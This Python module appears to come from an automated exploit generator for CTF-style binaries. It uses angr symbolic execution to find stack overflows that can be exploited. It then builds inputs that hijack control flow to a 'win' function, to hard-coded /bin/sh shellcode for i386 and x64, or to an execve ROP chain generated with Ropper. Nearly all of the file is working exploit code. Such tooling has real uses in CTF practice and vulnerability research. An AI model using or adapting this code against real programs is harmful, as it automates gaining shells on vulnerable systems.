from __future__ import print_function
import angr
import claripy
import timeout_decorator
import r2pipe
import json

from pwnlib.util.packing import p32
from ropper import RopperService
from angr import sim_options as so
from pwn import *

from lib.hookFour import hookFour


def getRopchain(properties, bad_bytes):
    """
    ' given n files, generate an execve rop chain and return it.
    ' I did not want to try and butcher ropper, so rs.createRopChain
    ' returns python code to print the rop chain to stdout
    ' I run it and steal the "rop" variable for my chain
    '
    ' This is horrible code, do not repeat my mistakes
        'badbytes': ''.join(bad_bytes),
    """
    options = {'color': False,
               'badbytes': ''.join(bad_bytes),
               'all': False,
               'inst_count': 6,
               'type': 'all',
               'count_of_findings': 5,
               'cfg_only': False,
               'detailed': False}

    rs = RopperService(options)
    print(properties['libc'])
    if 'libc' in properties and properties['libc'] is not None:
        rs.addFile(properties['libc'])
    rs.addFile(properties['file'])
    rs.loadGadgetsFor()

    '''Acceptable arches are formated differently than pwntools:
    x86
    x86_64
    ARM
    ... see https://github.com/sashs/Ropper/blob/a708fae670eece2b86daeaa276b38cb033eab231/README.md'''

    # These arches can span to mips and ppc
    arch = 'x86'
    if '64' in properties['protections']['arch']:
        arch = 'x86_64'
    elif 'arm' in properties['protections']['arch'].lower():
        arch = 'ARM'

    # If you were looking for good programming examples, you've
    # come to the wrong place friend
    chain = rs.createRopChain("execve", arch, {'cmd': '/bin/sh'})

    if "Cannot create chain" in chain or 'INSERT' in chain:
        print("[-] Failed to create rop chain. Try adding linked libraries")
        if 'libc' not in properties or properties['libc'] is None:
            print("[~] Try adding linked libc")
        exit(0)

    namespace = {}
    exec(chain, namespace)  # rop variable created inside of "chain" python script
    if 'libc' in properties:
        rs.removeFile(properties['libc'])
    rs.removeFile(properties['file'])

    return namespace['rop']


def getShellcode(properties):
    context.arch = properties['protections']['arch']

    if context.arch == 'i386':  # /bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    elif context.arch == 'x64':  # /bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode


def exploitOverflow(binary_name, properties, inputType="STDIN"):
    p = angr.Project(binary_name, auto_load_libs=False)
    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
    p.hook_symbol('rand', hookFour)
    p.hook_symbol('srand', hookFour)

    # Setup state based on input type
    argv = [binary_name]
    if inputType in ["STDIN", 'FILE', 'SOCKET']:
        state = p.factory.full_init_state(args=argv, add_options=extras)
    elif inputType == "LIBPWNABLE":
        handle_connection = p.loader.main_object.get_symbol("handle_connection")
        start_addr = handle_connection.rebased_addr
        reg_values = getRegValues(binary_name, start_addr)
        state = p.factory.entry_state(args=argv, env=os.environ, addr=start_addr, add_options=extras)

        # Just set the registers
        register_names = state.arch.register_names.values()
        for register in register_names:
            if register in reg_values:  # Didn't use the register
                state.registers.store(register, reg_values[register])
    elif inputType == "ARG":
        arg = claripy.BVS("arg1", 256 * 8)
        argv.append(arg)
        state = p.factory.full_init_state(args=argv, add_options=extras)
        state.globals['arg'] = arg
    else:
        print("[-] Unsupported inputType:", inputType)
        exit(1)
        return

    state.libc.max_packet_size = 256  # must be increased to allow exploits requiring large reads
    state.globals['inputType'] = inputType
    simgr = p.factory.simgr(state, save_unconstrained=True)

    step_func = pickFilter(properties)
    if step_func is None:
        print("[-] Error could not devise exploit strategy")
        exit(1)

    run_environ = dict()
    run_environ['type'] = None
    end_state = None
    end_state_eb = None
    # Lame way to do a timeout
    try:
        @timeout_decorator.timeout(1200)
        def exploreBinary(simgr):
            simgr.explore(find=lambda s: 'type' in s.globals, step_func=step_func)

        exploreBinary(simgr)
        if 'found' in simgr.stashes and len(simgr.found):
            end_state = simgr.found[0]
            end_state_eb = end_state.globals['state_eb']
            run_environ['type'] = end_state.globals['type']
    except (KeyboardInterrupt, timeout_decorator.TimeoutError):
        print("[~] Overflow check timed out")

    if end_state is None:
        print("[-] Could not find end state")
    elif inputType == "LIBPWNABLE":
        run_environ['input'] = end_state.posix.dumps(0)
        run_environ['input_eb'] = end_state_eb.posix.dumps(0)
        print("[+] Triggerable with STDIN : {}".format(run_environ['input']))
    elif inputType == "ARG":
        arg_str = end_state.solver.eval(arg, cast_to=bytes)
        run_environ['input'] = arg_str
        print("[+] Triggerable with arg : {}".format(repr(arg_str)))
    elif inputType in ['STDIN', 'FILE', 'SOCKET']:
        run_environ['src_type'] = end_state.globals['src_type']
        fd = end_state.globals['fd']

        # save filename so we can write to it
        if run_environ['src_type'] == 'file':
            run_environ['filename'] = end_state.posix.fd[fd].file.name

        run_environ['input'] = end_state.posix.dumps(fd)
        run_environ['input_eb'] = end_state_eb.posix.dumps(fd)
        print("[+] Triggerable with {} : {}".format(run_environ['src_type'], run_environ['input']))
    else:
        print("[-] Unsupported inputType:", inputType)
        exit(1)
    return run_environ


def pad_addr(address, bits, endian='little'):
    """
    Pads the given address (int) to the given number of bits, returning a bytes object representation of the address
    with the given endianness
    """
    if bits == 32:
        return p32(address, endian=endian)
    elif bits == 64:
        botAddr = address & 0xFFFFFFFF
        topAddr = (address >> 32) & 0xFFFFFFFF
        return p32(topAddr, endian=endian) + p32(botAddr, endian=endian)
    else:
        print("[-] Unknown architecture:", bits)
        exit(1)


def constrainToAddress(state, sym_val, addr, endian='little'):
    """
    Given a symbolic value (sym_val) and an address (int), returns a list of constraints that can be added to a
    simulation state such that the bytes of the symbolic value are equal to the bytes of the address with the given
    endianness
    """
    bits = state.arch.bits
    padded_addr = pad_addr(addr, bits, endian)

    constraints = []
    for i in range(int(bits / 8)):
        curr_byte = sym_val.get_byte(i)
        constraint = claripy.And(curr_byte == padded_addr[i])
        constraints.append(constraint)

    return constraints


def constrain_with_shellcode(state, constraints, address, shellcode):
    # add all the constraints we've been given
    for constraint in constraints:
        state.add_constraints(constraint)

    # Setup shellcode
    memory = state.memory.load(address, len(shellcode))
    shellcode_bvv = state.se.BVV(shellcode)

    # Constrain shellcode in memory if possible
    if state.se.satisfiable(extra_constraints=[memory == shellcode_bvv]):
        state.add_constraints(memory == shellcode_bvv)

    # NOTE old code would constrain stdin to be printable


def fully_symbolic(state, variable):
    """
    check if a symbolic variable is completely symbolic
    """
    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False
    return True


def is_exploit_source(state, fd, shellcode, addr):
    dump = state.posix.dumps(fd)

    # socket dump is a tuple, index zero is the read data so we examine that data
    if type(dump) == tuple:
        dump = dump[0]

    return shellcode in dump and all([x in dump for x in addr])


def pickFilter(properties):
    def point_to_win_filter(simgr):
        for path in simgr.unconstrained:
            state = path.state

            eip = state.regs.pc
            bits = state.arch.bits

            for func in properties['win_functions']:
                state_copy = state.copy()
                address = properties['win_functions'][func]['fcn_addr']

                padded_addr = 0

                if bits == 32:
                    padded_addr = p32(address)
                elif bits == 64:
                    botAddr = address & 0xFFFFFFFF
                    topAddr = (address >> 32) & 0xFFFFFFFF
                    padded_addr = p32(topAddr) + p32(botAddr)

                # Constrain pc to win func
                constraints = constrainToAddress(state_copy, eip, address)

                # Check satisfiability
                if state_copy.se.satisfiable(extra_constraints=constraints):
                    for constraint in constraints:
                        state_copy.add_constraints(constraint)

                    # Check by input
                    if state_copy.globals['inputType'] == "STDIN" or state_copy.globals['inputType'] == "LIBPWNABLE":
                        if all([x in state_copy.posix.dumps(0) for x in padded_addr]):

                            # Setup endianness
                            state_eb = state.copy()

                            # Constrain EIP
                            constraints_le = constrainToAddress(state, eip, address, endian='little')
                            constraints_eb = constrainToAddress(state, eip, address, endian='big')

                            # Constrain STDIN to printable if we can
                            if state.se.satisfiable(extra_constraints=constraints_le):
                                for constraint in constraints:
                                    state.add_constraints(constraint)

                            # Constrain STDIN to printable if we can
                            if state_eb.se.satisfiable(extra_constraints=constraints_eb):
                                for constraint in constraints_eb:
                                    state_eb.add_constraints(constraint)

                            # Little Endian
                            # Constrain rest of input to be printable
                            stdin = state.posix.files[0]
                            constraints = []
                            # stdin_size = len(stdin.all_bytes())
                            stdin_size = 100
                            stdin.length = stdin_size
                            stdin.seek(0)
                            stdin_bytes = stdin.all_bytes()
                            for i in range(stdin_size):
                                curr_byte = stdin.read_from(1)
                                constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                                if state.se.satisfiable(extra_constraints=[constraint]):
                                    constraints.append(constraint)

                            # Constrain STDIN to printable if we can
                            if state.se.satisfiable(extra_constraints=constraints):
                                for constraint in constraints:
                                    state.add_constraints(constraint)

                            # Big Endian
                            # Constrain rest of input to be printable
                            stdin = state_eb.posix.files[0]
                            constraints = []
                            # stdin_size = len(stdin.all_bytes())
                            stdin_size = 100
                            stdin.length = stdin_size
                            stdin.seek(0)
                            stdin_bytes = stdin.all_bytes()
                            for i in range(stdin_size):
                                curr_byte = stdin.read_from(1)
                                constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                                if state_eb.se.satisfiable(extra_constraints=[constraint]):
                                    constraints.append(constraint)

                            # Constrain STDIN to printable if we can
                            if state_eb.se.satisfiable(extra_constraints=constraints):
                                for constraint in constraints:
                                    state_eb.add_constraints(constraint)

                            # Get the string coming into STDIN
                            stdin_str = repr(str(state.posix.dumps(0).replace('\x00', '').replace('\x01', '')))
                            print("[+] Vulnerable path found {}".format(stdin_str))
                            state.globals['type'] = "Overflow"
                            state.globals['state_eb'] = state_eb
                            simgr.stashes['found'].append(path)
                            simgr.stashes['unconstrained'].remove(path)

                    elif state_copy.globals['inputType'] == "ARG":
                        arg = state.globals['arg']
                        arg_str = str(state_copy.solver.eval(arg, cast_to=str)).replace('\x00', '').replace('\x01', '')
                        if 'A' in arg_str:
                            constraints = []
                            for i in range(int(bits / 8)):
                                curr_byte = eip.get_byte(i)
                                constraint = claripy.And(curr_byte == 0x41)
                                constraints.append(constraint)

                            for i in range(arg.length):
                                curr_byte = arg.read_from(1)
                                constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                                if state.se.satisfiable(extra_constraints=[constraint]):
                                    constraints.append(constraint)

                            # Constrain STDIN to printable if we can
                            if state.se.satisfiable(extra_constraints=constraints):
                                for constraint in constraints:
                                    state.add_constraints(constraint)

                            arg_str = repr(
                                str(state.solver.eval(arg, cast_to=str)).replace('\x00', '').replace('\x01', ''))
                            print("[+] Vulnerable path found {}".format(arg_str))
                            state.globals['type'] = "Overflow"
                            simgr.stashes['found'].append(path)
                            simgr.stashes['unconstrained'].remove(path)

                    else:
                        print("[-] Input type not supported for win condition", state_copy.globals['inputType'])
        return simgr

    def point_to_shellcode_filter(simgr):
        for state in simgr.unconstrained:
            # quit early if pc is not fully symbolic (i.e., we cannot control it entirely)
            if not fully_symbolic(state, state.regs.pc):
                print("[~] Found unconstrained state but PC is not fully symbolic")
                continue

            shellcode = getShellcode(properties)

            addresses = []  # skip the reencoding step. takes too long anyway
            avoidList = []
            # TODO merge this step into the main loop
            for address in addresses:
                my_buf = state.memory.load(address, len(shellcode))

                # check if a symbolic buffer can contain the shellcode
                if not state.satisfiable(extra_constraints=[my_buf == shellcode]):
                    print("[~] Shellcode can't be placed. Checking for bad bytes.")

                    # figure out which bytes can't be placed in the buffer
                    for i in range(len(shellcode)):
                        curr_byte = state.memory.load(address + i, 1)
                        if not state.satisfiable(extra_constraints=[curr_byte == shellcode[i]]):
                            print("[-] Address {} Byte {} Can't be {}".format(hex(address + i), i, repr(shellcode[i])))
                            avoidList.append(shellcode[i])

                    print("Avoiding : {}".format(avoidList))
                    print("Old shellcode: {} {}".format(len(shellcode), repr(shellcode)))

                    # try to re-encode the shellcode to avoid the bad bytes
                    try:
                        expr = '['
                        for avoidByte in avoidList:
                            expr += chr(avoidByte)
                        expr += ']'
                        shellcode = encoders.encode(shellcode, avoid=avoidList, expr=expr)  # necessary for python 3
                        print("New shellcode: {} {}".format(len(shellcode), repr(shellcode)))
                    except PwnlibException:
                        print("[-] Unable to encode shellcode to avoid {}".format(avoidList))
                    except AttributeError:
                        print("[-] Error encoding shellcode")
                    except TypeError:
                        print("[-] Error building error string")
                    break

            # get all addresses we control
            # sort because some exploits only work on low addresses for some reason - speeds things up :)
            addresses = sorted([x for x in find_symbolic_buffer(state, len(shellcode))])

            bits = state.arch.bits
            for address in addresses:
                state_copy = state.copy()

                # Constrain pc to address, or quit early if we can't
                print("[+] Constraining to address {}".format(hex(address)))
                constraints = constrainToAddress(state_copy, state_copy.regs.pc, address)
                if not state_copy.se.satisfiable(extra_constraints=constraints):
                    print("[~] Constraining failed")
                    continue

                # Setup shellcode and load it at constrained address
                memory = state_copy.memory.load(address, len(shellcode))
                shellcode_bvv = state_copy.solver.BVV(shellcode)
                constraints.append(memory == shellcode_bvv)

                # TODO add shellcode reencoding step here

                # Setup endianness - A weird number of CTF problems have endianness issues, apparently
                # Constrain EIP to shellcode address
                state_eb = state.copy()
                constraints_eb = constrainToAddress(state_eb, state_eb.regs.pc, address, endian='big')

                # Check satisfiability
                if state_copy.se.satisfiable(extra_constraints=constraints) and \
                        state_eb.se.satisfiable(extra_constraints=constraints_eb) and \
                        len(constraints) == bits / 8 + 1 and \
                        len(constraints_eb) == bits / 8:
                    print("[+] Shellcode can be placed and PC constrained")

                    padded_addr = pad_addr(address, bits)

                    for constr in constraints:
                        state_copy.add_constraints(constr)

                    # Check by input
                    if state.globals['inputType'] == "LIBPWNABLE":
                        if is_exploit_source(state_copy, 0, shellcode, padded_addr):
                            # TODO WHY ARE WE REPEATING THIS? WE ALREADY HAVE AN EXPLOITABLE STATE
                            constrain_with_shellcode(state_eb, constraints_eb, address, shellcode)

                            # Get the string coming into STDIN
                            stdin_str = state_copy.posix.dumps(0)
                            print("[+] Vulnerable path found {}".format(stdin_str))
                            state.globals['type'] = "Overflow"
                            state.globals['state_eb'] = state_eb
                            simgr.stashes['found'].append(state)
                            try:
                                simgr.stashes['unconstrained'].remove(state)
                            except KeyboardInterrupt:
                                print("[~] Keyboard Interrupt")
                            except timeout_decorator.TimeoutError:
                                print("[~] Timeout")
                            return simgr
                        else:
                            print("[~] Met constraints, but address and shellcode do not appear in output")

                    elif state.globals['inputType'] in ["STDIN", "FILE", "SOCKET"]:
                        # iterate over all open file descriptors except stdout and stderr
                        fds = list(state_copy.posix.fd)
                        fds.remove(1)
                        fds.remove(2)

                        # check for shellcode and jump address in dumps of file descriptors
                        for fd in fds:
                            if is_exploit_source(state_copy, fd, shellcode, padded_addr):
                                # add constraints to big endian version
                                constrain_with_shellcode(state_eb, constraints_eb, address, shellcode)

                                state_copy.globals['type'] = "Overflow"
                                state_copy.globals['src_type'] = describe_fd(state_copy, fd)
                                state_copy.globals['fd'] = fd
                                state_copy.globals['state_eb'] = state_eb
                                simgr.stashes['found'].append(state_copy)
                                try:
                                    simgr.stashes['unconstrained'].remove(state)
                                except KeyboardInterrupt:
                                    print("[~] Keyboard Interrupt")
                                except timeout_decorator.TimeoutError:
                                    print("[~] Timeout")
                                return simgr
                        else:
                            print("[~] Met constraints, but address and shellcode do not appear in output")

                    elif state.globals['inputType'] == "ARG":
                        arg = state.globals['arg']
                        arg_str = state_copy.solver.eval(arg, cast_to=bytes)
                        if 'A' in arg_str:
                            constraints = []
                            for i in range(int(bits / 8)):
                                curr_byte = state.regs.pc.get_byte(i)
                                constraint = claripy.And(curr_byte == 0x41)
                                constraints.append(constraint)

                            # Constrain STDIN to printable if we can
                            for i in range(arg.length):
                                curr_byte = arg.read_from(1)
                                constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                                if state.se.satisfiable(extra_constraints=[constraint]):
                                    constraints.append(constraint)

                            if state.se.satisfiable(extra_constraints=constraints):
                                for constraint in constraints:
                                    state.add_constraints(constraint)

                            arg_str = str(state.solver.eval(arg, cast_to=str))
                            print("[+] Vulnerable path found {}".format(arg_str))
                            state.globals['type'] = "Overflow"
                            simgr.stashes['found'].append(state)
                            simgr.stashes['unconstrained'].remove(state)
                            return simgr
        return simgr

    '''
    This function just swaps out shellcode for ropchain.
    There has to be a better way to genericize this
    '''

    def point_to_ropchain_filter(simgr):
        for path in simgr.unconstrained:
            bad_bytes = set()
            rop_chain = getRopchain(properties, bad_bytes)
            state = path.state

            eip = state.regs.pc
            bits = state.arch.bits

            state_copy = state.copy()

            addresses = [x for x in find_symbolic_buffer(state_copy, len(rop_chain))]
            if len(addresses):
                list.sort(addresses)

            for address in addresses:
                my_buf = state_copy.memory.load(address, len(rop_chain))
                if not state_copy.satisfiable(extra_constraints=([my_buf == rop_chain])):
                    print("[~] rop chain can't be placed. Checking for bad bytes.")
                    for i in range(len(rop_chain)):
                        curr_byte = state_copy.memory.load(address + i, 1)
                        if state_copy.satisfiable(extra_constraints=([curr_byte == rop_chain[i]])):
                            pass
                        else:
                            print("[-] Address {} Byte {} Can't be {}".format(hex(address + i), i, repr(rop_chain[i])))
                            #                            byte_hex = hex(rop_chain[i]).rstrip('L').rstrip('0x')
                            byte_hex = rop_chain[i].encode('hex')
                            bad_bytes.add(byte_hex)
                    print("Avoiding : {}".format(bad_bytes))
                    print("Old ropchain: {} {}".format(len(rop_chain), repr(rop_chain)))

                    try:
                        rop_chain = getRopchain(properties, bad_bytes)
                    except Exception as e:
                        print(e)
                        print("[-] Error building rop_chain. To many bad bytes?")
                        exit(0)
                    break

            addresses = [x for x in find_symbolic_buffer(state_copy, len(rop_chain))]

            for address in addresses:
                print(("[+] Found address at {}\r".format(hex(address))), end=' ')
                state_copy = state.copy()

                padded_addr = pad_addr(address, bits)
                my_buf = state.memory.load(address, len(rop_chain))

                # Constrain pc to rop_chain
                constraints = constrainToAddress(state_copy, eip, address)

                # Setup rop_chain
                memory = state_copy.memory.load(address, len(rop_chain))
                rop_chain_bvv = state_copy.se.BVV(rop_chain)

                constraints.append(memory == rop_chain_bvv)

                # Setup endianness - A weird number of CTF problems have endianess issues
                state_eb = state.copy()

                # Constrain EIP to rop_chain address
                constraints_le = constrainToAddress(state, eip, address, endian='little')
                constraints_eb = constrainToAddress(state_eb, eip, address, endian='big')

                # Check satisfiability
                if state_copy.se.satisfiable(extra_constraints=constraints) and \
                        state_eb.se.satisfiable(extra_constraints=constraints_eb) and \
                        state.se.satisfiable(extra_constraints=constraints_le) \
                        and len(constraints_eb) == 4 \
                        and len(constraints_le) == 4:
                    print("[+] Win")
                    for constraint in constraints:
                        state_copy.add_constraints(constraint)

                    # Check by input
                    if state_copy.globals['inputType'] == "STDIN" or state_copy.globals['inputType'] == "LIBPWNABLE":
                        if all([x in state_copy.posix.dumps(0) for x in padded_addr]) and \
                                all([x in state_copy.posix.dumps(0) for x in rop_chain]):

                            constrain_with_shellcode(state, constraints, address, rop_chain)
                            constrain_with_shellcode(state_eb, constraints_eb, address, rop_chain)

                            # Get the string coming into STDIN
                            # stdin_str = repr(str(state.posix.dumps(0).replace('\x00\x00\x00','').replace('\x01','')))
                            stdin_str = repr(str(state.posix.dumps(0)))
                            print("[+] Vulnerable path found {}".format(stdin_str))
                            state.globals['type'] = "Overflow"
                            state.globals['state_eb'] = state_eb
                            simgr.stashes['found'].append(path)
                            try:
                                simgr.stashes['unconstrained'].remove(path)
                            except (KeyboardInterrupt, timeout_decorator.TimeoutError):
                                pass
                            break

                    if state_copy.globals['inputType'] == "ARG":
                        arg = state.globals['arg']
                        arg_str = str(state_copy.solver.eval(arg, cast_to=str))
                        if 'A' in arg_str:
                            constraints = []
                            for i in range(int(bits / 8)):
                                curr_byte = eip.get_byte(i)
                                constraint = claripy.And(curr_byte == 0x41)
                                constraints.append(constraint)

                            for i in range(arg.length):
                                curr_byte = arg.read_from(1)
                                constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                                if state.se.satisfiable(extra_constraints=[constraint]):
                                    constraints.append(constraint)

                            # Constrain STDIN to printable if we can
                            if state.se.satisfiable(extra_constraints=constraints):
                                for constraint in constraints:
                                    state.add_constraints(constraint)

                            arg_str = str(state.solver.eval(arg, cast_to=str))
                            print("[+] Vulnerable path found {}".format(arg_str))
                            state.globals['type'] = "Overflow"
                            simgr.stashes['found'].append(path)
                            simgr.stashes['unconstrained'].remove(path)
        return simgr

    if properties['win_functions']:
        print("[+] Using point to win function technique")
        return point_to_win_filter
    elif not properties['protections']['nx']:
        print("[+] Binary does not have NX")
        print("[+] Placing shellcode and pointing")
        return point_to_shellcode_filter
    else:
        print("[+] Building rop and pointing")
        return point_to_ropchain_filter


def check_continuity(address, addresses, length):
    """
    check if the region at 'address' contains 'length' amount of controlled memory.
    """
    for i in range(length):
        if not address + i in addresses:
            return False
    return True


def add_sym_addrs(state, sym_addrs, srcident):
    for _, symbol in state.solver.get_variables('file', srcident):
        sym_addrs.update(state.memory.addrs_for_name(next(iter(symbol.variables))))


def find_symbolic_buffer(state, length, arg=None):
    """
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's control
    """
    sym_addrs = set()  # used to be a list. set improves performance
    # get all the symbolic bytes from stdin
    if arg is not None:
        for var in arg.variables:
            sym_addrs.update(state.memory.addrs_for_name(var))
    else:
        # report all addresses controlled by stdin, opened file descriptors, and sockets
        if state.globals['inputType'] in ['STDIN', 'FILE', 'SOCKET']:
            add_sym_addrs(state, sym_addrs, state.posix.stdin.ident)

            fds = list(state.posix.fd)

            # ignore fd 0, 1, and 2 as they are stdin, stdout, and stderr
            for i in range(3):
                fds.remove(i)

            # report addresses controlled by all file descriptors
            for fd in fds:
                add_sym_addrs(state, sym_addrs, state.posix.fd[fd].file.ident)

            # TODO add addresses controlled by sockets
        else:  # LIBPWNABLE
            add_sym_addrs(state, sym_addrs, state.posix.stdin.ident)

    # we only care about addresses with enough space to fit the shellcode
    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr


def describe_fd(state, fd):
    if fd == 0:
        return 'stdin'
    elif fd == 1:
        return 'stdout'
    elif fd == 2:
        return 'stderr'
    elif 'socket' in state.posix.fd[fd].read_storage.ident:
        return 'socket'
    elif 'file' in state.posix.fd[fd].read_storage.ident:
        return 'file'
    else:
        print("[-] Could not determine type of file descriptor")
        return ''


def getRegValues(filename, endAddr):
    r2 = r2pipe.open(filename)
    r2.cmd('doo')
    r2.cmd('dcu {}'.format(endAddr))
    regs = json.loads(r2.cmd('drj'))
    r2.quit()
    return regs
